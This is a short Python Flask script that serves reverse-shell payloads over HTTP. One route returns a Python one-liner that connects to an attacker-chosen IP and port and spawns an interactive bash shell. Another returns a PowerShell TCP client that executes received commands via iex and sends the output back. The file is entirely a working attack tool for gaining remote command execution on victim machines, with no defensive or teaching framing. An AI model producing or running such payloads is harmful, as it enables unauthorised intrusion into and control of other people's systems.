import flask,sys

IP=sys.argv[1]
PORT=sys.argv[2]
app=flask.Flask(__name__)
@app.route('/')
def info():
  h1_1="<h1>python shell: /py/shell?ip=[ip]&port=[port]"
  h1_2="<h1>PS shell: /ps/shell?ip=[ip]&port=[port]"
  return f'{h1_1} {h1_2}'
@app.route('/py/shell',methods=['GET'])
def send_py_code():
 s=flask.request.args.get('ip',type=str)
 p=flask.request.args.get('port')
 python_rev_shell=f'import socket,os,subprocess; sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);os.dup2(sk.fileno(),0);os.dup2(sk.fileno(),1);os.dup2(sk.fileno(),2); sk.connect(("{s}",{int(p)})); subprocess.run(["/bin/bash","-i"],text=True);'
 return python_rev_shell
@app.route('/ps/shell',methods=['GET'])
def send_ps_code():
  s=flask.request.args.get('ip',type=str)
  p=int(flask.request.args.get('port'))
  ps_rev_shell=f'$client = New-Object System.Net.Sockets.TCPClient("{s}",{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
  return ps_rev_shell


app.run(host=IP,port=PORT)
